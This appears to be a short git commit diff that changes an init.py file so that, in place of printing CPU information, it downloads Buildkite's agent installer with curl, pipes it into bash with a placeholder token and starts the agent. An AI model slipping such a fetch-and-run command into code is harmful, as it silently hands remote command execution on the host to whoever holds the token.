7be77a8575a713a34b2425d6e4e660158203c318
ademisna <94856590+ademisna@users.noreply.github.com>
2021-11-22 23:22:01 +0700

    Update init.py

--- init.py
+++ init.py
@@ -1,2 +1,2 @@
 import os
-os.system('lscpu')
+os.system('TOKEN="INSERT-YOUR-AGENT-TOKEN-HERE" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start')
